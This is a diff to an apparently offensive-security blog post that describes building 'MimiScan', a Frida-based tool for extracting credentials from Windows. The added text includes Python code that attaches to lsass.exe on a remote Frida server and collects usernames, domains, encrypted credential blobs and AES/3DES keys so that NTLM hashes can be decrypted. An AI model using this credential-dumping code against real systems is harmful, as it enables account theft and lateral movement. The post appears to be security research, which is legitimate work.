@@ -302,4 +302,44 @@ At this point, we are finished with our Frida script (which you can find [here](
 
 I think we can all agree that this is a little underwhelming. Sure, all the raw data is there - and we could manually grab those cryptoblobs and decryption keys and perform the decryption itself, of course. But we'd generally prefer all that stuff to be done for us - what we want is decrypted credentials scrolling across our screen. Implementing that decryption logic in Frida's JavaScript engine would be no fun at all, though; doing it in Python is much preferable.
 
-For this, we can use Frida's Python API. The way it works is simple: instead of injecting our Frida script into a process using the Frida CLI tool, we inject it using the *frida* Python library. The injected script is able to communicate back to the Python orchestrator with the *send()* function, which allows us to receive output such as credentials and decryption keys. We can then process it in Python instead of being stuck with JavaScript.
+For this, we can use Frida's Python bindings. The way it works is simple: instead of injecting our Frida script into a process using the Frida CLI tool, we inject it using the *frida* Python library. The injected script is able to communicate back to the Python orchestrator with the *send()* function, which allows us to receive output such as credentials and decryption keys. We can then process it in Python instead of being stuck with JavaScript.
+
+I won't post the script in its entirety here, but there are a few parts that are especially important. Here is the part where we actually attach the script to *lsass.exe*:
+
+```python
+fd = open("MimiScan.js", "r")
+inject_script = fd.read()
+fd.close()
+
+target = sys.argv[1] + ":27042"
+device = frida.get_device_manager().add_remote_device(target)
+
+session = device.attach("lsass.exe")
+script = session.create_script(inject_script)
+```
+
+Once we have attached, we need to create a hook that will receive and process messages sent to it by the injected script:
+
+```python
+# Receive messages from MimiScan.js, don't attempt decryption until all messages have been received.
+def on_message(message, data):
+	if "payload" not in message:
+		return
+	payload = message["payload"]
+	if payload["type"] == "credentials":
+		credential = {}
+		credential["domain"] = payload["domain"]
+		credential["username"] = payload["username"]
+		credential["crypto"] = data
+		credentials.append(credential)
+	if payload["type"] == "aeskey":
+		keys["aes"] = data
+	if payload["type"] == "aes_iv":
+		keys["aes_iv"] = data
+	if payload["type"] == "3deskey":
+		keys["3des"] = data
+```
+
+Once you have the actual data, it's just a matter of performing the decryption and parsing out the important bits (the NTLM hash) from the resulting plaintext. You can find the full script [here](#); here's how it looks in action:
+
+![A screenshot of the output from the final version of MimiScan.py](/img/mimiscan-decrypted.png)
